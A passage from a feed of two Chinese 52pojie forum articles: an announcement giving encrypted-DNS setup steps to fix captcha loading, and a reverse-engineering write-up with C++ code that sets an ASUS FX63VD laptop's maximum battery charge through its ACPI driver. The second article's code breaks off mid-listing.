💡建议绑定QQ，使用QQ登录可免除验证码问题。后期将启用新验证码机制，加强用户体验。<br />
ℹ️更多问题解决方案和公告请关注官方论坛www.52pojie.cn。<br /> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-03-20 16:50</span> <span style="display: inline-block;">北京</span>
</p>

<p>近期收到部分同学反馈，登录论坛无法显示验证码，经过远程诊断分析发现都是DNS解析错误导致的，我们强烈推荐电脑浏览器使用加密DNS进行网络访问，减少网络劫持的发生。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=6cc91a9e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupxjicDOnINJbyOsGNgibWttfqaBhX7ibMG8knT0DwrTIKGDTNib6N4okhDg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><span style="font-size: 20px;"><span style="font-size: 20px; letter-spacing: 0.034em;"><span style="color: rgb(47, 50, 56); font-family: Helvetica, Arial, sans-serif; letter-spacing: normal; background-color: rgb(255, 255, 255);">近期收到部分同学反馈，登录论坛无法显示验证码，经过远程诊断分析发现都是DNS解析错误导致的，</span><span>我们强烈推荐电脑浏览器使用</span></span><span>加密DNS进行网络访问，减少网络劫持的发生，国内推荐：</span></span><br /></p><p style="margin-bottom: 0px; line-height: normal;"><span style="font-size: 14px;"><span></span></span></p><p style="margin-bottom: 0px; line-height: normal;"><span style="font-size: 14px;"><span>阿里加密DNS：</span><br /><span>https://dns.alidns.com/dns-query</span><br /><span>腾讯加密DNS：</span><br /><span>https://doh.pub/dns-query</span></span></p><p style="margin-bottom: 0px; line-height: normal;"><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>一：在浏览器中设置加密DNS方法</span><span style="font-size: 15px;"><br /><br /><span>Microsoft Edge浏览器</span><br /><span>步骤：</span><br /><span>1、打开Edge -- “设置” -- ”隐私、搜索和服务“ -- 开启“</span><span>使用安全的 DNS 指定如何查找网站的网络地址</span><span>”功能。</span><br /><span>2、选择”</span><span>请选择服务提供商</span><span>“，然后填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ab5943ea&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupuiczEMpnAhn1BX0jPQZQ7zb2tjf0xKDvZb7YQ3aclbh54eOGM3AdGeg%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span style="font-size: 15px;"><span>Google Chrome浏览器</span><br /><span>步骤：</span><br /><span>1、打开Chrome --  ”设置“ -- ”隐私和安全“ -- ”安全“ -- 找到”对您访问的网站的名称进行加密“并开启。</span><br /><span>2、然后在”选择 DNS 提供商“右层勾选选择”添加自定义 DNS 服务提供商“ ，然后填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9cd48f0d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupL4zuiabrgibcd3akua3mumEfV4ZrYmNcts3ywllXVibf6UeB4avbtVupg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span style="font-size: 15px;"><span>360 极速浏览器X</span><br /><span>步骤：</span><br /><span>1、打开360 极速浏览器X -- ”设置“ -- 搜索”DNS“。</span><br /><span>2、点击”开启DNS安全解析“，在”使用自定义网址“中填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a149bbf6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupplQeABWGXgcibo63aZpKvBx2Pn8AS5XbMatFC9rKJGl0fZKgL0LyyZg%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span style="font-size: 15px;"><span>Firefox火狐浏览器</span><br /><span>步骤：</span><br /><span>1、打开火狐浏览器 -- ”设置“ -- 搜索”DNS“ -- 找到”安全 DNS 启用策略“。</span><br /><span>2、点击”增强保护“，在”选择提供方“中选择”自定义“，然后填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=29b99ab4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupj1icw7LvqcgdyKQ1cSbz7yTCLxuta7J8J9IE42MEticR2jS8KaG0wGXQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span>其他浏览器应该都有类似功能，直接设置中搜索”DNS“即可找到，按照上面方法设置即可，<span style="font-weight: 700;">设置完记得重启浏览器</span>。<br /><br /></span><span><span>二、使用Windows 11操作系统，系统本身支持加密DNS设置</span>，其他老系统无法直接支持，推荐上面浏览器设置的方式。</span><span style="font-size: 15px;"><br /><span>步骤：</span><br /><span>1、打开“网络和Internet”设置，点击“以太网”，编辑“DNS服务器分配”，开启手动编辑IPv4的加密DNS，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ae2e701a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKa600S04jLEXaDqvylNJup6jPsfzfDNhmSNH6g0pTOqxRicp9tfbqXenz6bkiclKEVnJFmuFmnQ8EQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span>2、保存后重启浏览器即可，如果过程不够详细请自行在网络搜索”Windows 11 DOH 设置“进行学习。<br /><br /></span><span>三、手机系统和手机浏览器请自行根据设备和浏览器信息在网络搜索”设备名称 加密DNS“、”浏览器名称 DOH 设置“方法来解决，由于品牌和方法不通用本文不再赘述。</span></p><p style="margin-bottom: 0px; line-height: normal;"><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><span>更多问题解决方案详见左下角”阅读原文“。</span></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><strong><span>建议大家可以绑定QQ，使用QQ登录可以免除验证码问题。</span></strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><strong><span>后期我们将启用新的验证码机制，加强用户体验。</span></strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-98585-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 20 Mar 2024 16:50:19 +0800</pubDate>
</item>
<item>
<title>华硕fx63vd7700充电保护程序“ASUS Battery Health Charging”逆向分析</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140308&amp;idx=1&amp;sn=97258089fd7ac9252b638ffc7e9fde7d&amp;chksm=bd50a0808a27299644a5f10d065b50f003660f6e057e5d5d6af238f63bb0c1c4d3b3a995e70c&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140308&amp;idx=1&amp;sn=97258089fd7ac9252b638ffc7e9fde7d&amp;chksm=bd50a0808a27299644a5f10d065b50f003660f6e057e5d5d6af238f63bb0c1c4d3b3a995e70c&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 1. 作者对华硕飞行堡垒fx63vd7700型号的充电保护程序进行了分析，发现可以控制最高充电百分比。<br />
2. 该充电保护程序有三种模式：完整充电模式、平衡保养模式、最佳保养模式，分别限制充电百分比为100%、80%和60%。<br />
3. 通过动态调试和静态分析，作者发现DeviceIoControl函数用于和设备通信，并结构体中的perecent字段可以控制充电百分比。<br />
4. 作者通过C++代码复现了控制笔记本最高充电百分比的方法，可以修改为60%、80%和100%这三种数值，其他数值会默认为100%。<br />
5. 作者提供了代码和操作步骤，可以自行尝试修改最高充电百分比。<br />
6. 对于其他品牌或型号的笔记本电脑，该充电保护程序不适用。<br /> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-03-19 16:10</span> <span style="display: inline-block;">北京</span>
</p>

<p>最近好奇这个充电保护程序为什么可以控制最高充电百分比，所以我想分析一下。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=284c2aa3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPficsjPQoYJn1Wo1aDTKqlpyecicN35EWe4UA5HJmmElwqic7qUmBlxXSZw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; margin-top: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>SNSD99</strong></p><p style="margin-bottom: 0px; margin-top: 0px;"><br /></p><p style="margin-bottom: 0px; margin-top: 0px;"><span>0.前言</span><br /><span>最近好奇这个充电保护程序为什么可以控制最高充电百分比，所以我想分析一下。</span><br /><span>该程序适用于华硕飞行堡垒fx63vd7700型号，如果适用华硕其它型号的可以试试看。</span><br /><span>注意该充电保护程序不适用于其它品牌、或华硕其它型号的笔记本电脑。</span><br /><span>这个软件的界面如下图所示。</span><br /><span>模式有三种：完整充电模式、平衡保养模式、最佳保养模式。三种模式限制充电百分比分别为100%，80%、和60%。</span><br /><img class="rich_pages wxw-img" height="550" src="https://https://wechat2rss.xlab.app/img-proxy/?k=710fb399&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfOjR4nLHo1d5rQy5O34grynMzl9MhdCEok25YnyunQL0iaCsaMX3Aiaog%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="800" /><br /><br /><span>目录如下：</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6b2845e9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfcYCyjpwpVp7uPsx3iaCpCh0bMpHj0QmDJPxqOyOoOqtuLP4G1l08PQQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="645" /><br /><br /><span>1.x64dbg动态调试</span><br /><span>双击BhcApp.exe，启动充电保护软件。x64dbg附加“</span><span>BhcMgr.exe</span><span>”。</span><br /><span>在</span><span>DeviceIoControl</span><span>处插入断点，这个函数用于和设备通信，随便选中一个模式然后点确定就会触发断点。</span><br /><span>例如我选中的“平衡保养模式”。</span><br /><span>调用堆栈如下图所示。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=40366b9e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfe9nM4Q6ARtwnD4lInM0nMCP4BZlZzCOkrSLyEUtgEXxIsG9LpIqIwg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="877" /><br /><br /><span>DeviceIoControl的参数如下：</span><br /></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__function">BOOL <span class="code-snippet__title">DeviceIoControl</span>(<span class="code-snippet__params"></span></span></span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                HANDLE       hDevice,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                DWORD        dwIoControlCode,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, optional]      LPVOID       lpInBuffer,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                DWORD        nInBufferSize,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">out</span>, optional]     LPVOID       lpOutBuffer,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                DWORD        nOutBufferSize,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">out</span>, optional]     LPDWORD      lpBytesReturned,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, <span class="code-snippet__keyword">out</span>, optional] LPOVERLAPPED lpOverlapped</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">)</span>;</span></code></pre><p></p><br /><p><br /><span>回到DeviceIoControl上层函数“sub_321C90”。观察DeviceIoControl的入参：</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=49686a28&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfJcn3I30ce7XsGEBghhmALhLV24jQuibjcz76OJcPnGPpIpKPzpudu0Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><span></span><br /><br /><span>HANDLE hDevice = 0x274</span><br /><span>DWORD dwIoControlCode = 0x22240C</span><br /><span>LPVOID lpInBuffer = 0xB7F010</span><br /><span>DWORD nInBufferSize = 0x10</span><br /><span>LPVOID lpOutBuffer = 0x93F238</span><br /><span>DWORD nOutBufferSize = 0x400</span><br /><span>LPDWORD lpBytesReturned = 0x93F234</span><br /><span>LPOVERLAPPED lpOverlapped = 0</span><br /><br /><span><span style="font-size: 18px;">1.1 查看缓冲区lpInBuffer: 0xB7F010</span></span><br /><span>如下图所示为缓冲区内容，大小0x10字节。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6eb8296a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPflsfSj6HhibzyBlgqUDiapxQ5FtlVm4dLDMfdm190R6icicTZU5EpRvZWdA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="621" /><span></span><br /><br /><span>这个可以视为一个结构体。代码如下。</span></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">struct</span> <span class="code-snippet__title">BatteryIOCtlInfo</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        DWORD head; <span class="code-snippet__comment">// 头部</span></span></code><code><span class="code-snippet_outer">        DWORD nextSize; <span class="code-snippet__comment">// 后续结构体成员大小</span></span></code><code><span class="code-snippet_outer">        DWORD num2; <span class="code-snippet__comment">// 未知四字节数，固定为0x120057</span></span></code><code><span class="code-snippet_outer">        DWORD perecent; <span class="code-snippet__comment">// 充电百分比，0x50为80%，0x3C为60，0x64为100%</span></span></code><code><span class="code-snippet_outer">};</span></code></pre><p></p><br /><p><span></span></p><p><span>结构体各成员值填写为：</span></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">BatteryIOCtlInfo btinfo;</span></code><code><span class="code-snippet_outer">btinfo.head = <span class="code-snippet__number">0x53564544</span>;</span></code><code><span class="code-snippet_outer">btinfo.nextSize=<span class="code-snippet__number">8</span>;</span></code><code><span class="code-snippet_outer">btinfo.num2 = <span class="code-snippet__number">0x120057</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">// 0x3c 60%</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">// 0x50 80%</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">// 0x64 100%</span></span></code><code><span class="code-snippet_outer">btinfo.perecent = <span class="code-snippet__number">0x3c</span>;</span></code></pre><p></p><br /><p><br /></p><p><span>1.2 输出缓冲区lpOutBuffer: 0x93F238</span><br /><span>只有头四节被填充0x1，剩余的0x400 - 4个字节均为0.</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=60fdcceb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfVZvBhlpx2ywicQXBVq7fJtTSVobiaLzSGD2Cb53rVwyOG8vKkrnyCq4A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="646" /><br /><br /><span>输出缓冲区里的内容没有什么特别的，只需保证有输出缓冲区，以及该缓冲区有0x400字节大小即可。</span><br /><br /><span>2.IDA静态分析</span><br /><span>以上分析了DeviceIoControl的入参，但是还不知道设备句柄是怎么获取的。</span><br /><span>进入sub_321C90的代码段，在IDA为“</span><span>sub_401C90</span><span>”,00401D0C为调用DeviceIoControl的语句。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=38452642&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPft9dhND5hkxG2n3OwYdjPR9zGhtXFOLziaicIfwFaPP4phAAN1Svp5Qbg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1012" /><br /><br /><span>选中"hDevice"，按下X键看看哪个语句写入了这个hDevice。如下图所示。（Type：r表示读取read，w表示写入write）</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bee37751&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPf4Q8fa09XicZ3zE1Obpa7uaibfQ6jOfw4QAib7dU8om8V6yM25PL5WFZjQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="647" /><br /><br /><span>进入了函数</span><span>sub_401D70。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0306638f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfK0CuEoicPdN298C8msYtp1M5U9sq12lxOun3la6nuHtQ6Lru0oicw18g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1015" /><br /><br /><span>原来是CreateFileW打开（电池）设备的句柄。</span><br /><br /><span>CreateFileW参数如下：</span></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__type">HANDLE</span> <span class="code-snippet__type">CreateFileW</span>(</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">LPCWSTR</span>               lpFileName,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwDesiredAccess,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwShareMode,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, <span class="code-snippet__keyword">optional</span>] <span class="code-snippet__type">LPSECURITY_ATTRIBUTES</span> lpSecurityAttributes,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwCreationDisposition,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwFlagsAndAttributes,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, <span class="code-snippet__keyword">optional</span>] <span class="code-snippet__type">HANDLE</span>                hTemplateFile</span></code><code><span class="code-snippet_outer">);</span></code></pre><p></p><br /><p><span></span></p><p><span>LPCWSTR lpFileName："\\.\ATKACPI"</span><br /><span>DWORD dwDesiredAccess: 0xC0000000 ( GENERIC_READ | GENERIC_WRITE == 0xC0000000 )</span><br /><span>DWORD dwShareMode: 0x3 (FILE_SHARE_READ | FILE_SHARE_WRITE == 0x3)</span><br /><span>LPSECURITY_ATTRIBUTES lpSecurityAttributes: NULL</span><br /><span>DWORD dwCreationDisposition: 0x3 (OPEN_EXISTING == 3)</span><br /><span>DWORD dwFlagsAndAttributes: NULL</span><br /><span>HANDLE hTemplateFile: NULL</span><br /><br /><span>3. 代码复现</span><br /><span>因此控制笔记本最高充电百分比的C++代码如下：</span><br /></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;stdio.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;stdlib.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;Windows.h&gt;</span></span></span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">struct</span> <span class="code-snippet__title">BatteryIOCtlInfo</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    DWORD head;</span></code><code><span class="code-snippet_outer">    DWORD nextSize;</span></code><code><span class="code-snippet_outer">    DWORD num2;</span></code><code><span class="code-snippet_outer">    DWORD perecent;</span></code><code><span class="code-snippet_outer">};</span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">main</span><span class="code-snippet__params">(<span class="code-snippet__keyword">int</span> argc, <span class="code-snippet__keyword">char</span>** argv, <span class="code-snippet__keyword">char</span>** envp)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// GENERIC_READ | GENERIC_WRITE == 0xC0000000</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// FILE_SHARE_READ | FILE_SHARE_WRITE == 0x3</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// OPEN_EXISTING == 3</span></span></code><code><span class="code-snippet_outer">    HANDLE hhh = CreateFileW</span></code><code><span class="code-snippet_outer">        (</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__string">L"\\\\.\\ATKACPI"</span>, </span></code><code><span class="code-snippet_outer">            GENERIC_READ | GENERIC_WRITE,</span></code><code><span class="code-snippet_outer">            FILE_SHARE_READ | FILE_SHARE_WRITE, </span></code><code><span class="code-snippet_outer">            <span class="code-snippet__literal">NULL</span>,</span></code><code><span class="code-snippet_outer">            OPEN_EXISTING,</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__literal">NULL</span>,</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__literal">NULL</span></span></code><code><span class="code-snippet_outer">        );</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">//</span></span></code><code><span class="code-snippet_outer">    BatteryIOCtlInfo btinfo;</span></code><code><span class="code-snippet_outer">    btinfo.head = <span class="code-snippet__number">0x53564544</span>;</span></code><code><span class="code-snippet_outer">    btinfo.nextSize=<span class="code-snippet__number">8</span>;</span></code><code><span class="code-snippet_outer">    btinfo.num2 = <span class="code-snippet__number">0x120057</span>;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// 0x3c 60%</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// 0x50 80%</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// 0x64 100%</span></span></code><code><span class="code-snippet_outer">    btinfo.perecent = <span class="code-snippet__number">0x3c</span>;  <span class="code-snippet__comment">// 修改此处数值</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// out buffer</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">void</span>* out_buf = <span class="code-snippet__built_in">malloc</span>(<span class="code-snippet__number">0x400</span>);</span></code><code><span class="code-snippet_outer">    DWORD returnBytes = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">//</span></span></code><code><span class="code-snippet_outer">    DeviceIoControl(</span></code><code><span class="code-snippet_outer">        hhh,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__number">0x22240C</span>,</span></code><code><span class="code-snippet_outer">        &amp;btinfo,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">sizeof</span>(btinfo),</span></code><code><span class="code-snippet_outer">        out_buf,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__number">0x400</span>,</span></code><code><span class="code-snippet_outer">        &amp;returnBytes,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__literal">NULL</span>);</span></code><code><span class="code-snippet_outer">    CloseHandle(hhh);</span></code><code><span class="code-snippet_outer">    <span 